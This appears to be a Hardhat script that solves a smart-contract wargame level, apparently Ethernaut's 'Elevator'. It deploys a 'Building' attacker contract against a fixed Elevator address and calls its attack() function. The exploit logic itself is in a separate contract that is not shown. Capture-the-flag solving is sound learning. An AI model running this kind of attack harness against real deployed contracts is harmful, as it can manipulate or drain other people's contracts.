import { ethers } from "hardhat";

async function main() {
  const elevator = await ethers.getContractAt("contracts/Elevator.sol:Elevator", "0x81Ee96d9e88F03a5d50C9dd881880Fc373885A07");

  const Building = await ethers.getContractFactory("contracts/Building.sol:Building");
  const building = await Building.deploy(elevator.address);
  console.log("attacker deployed at", building.address);

  const tx = await building.attack();
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
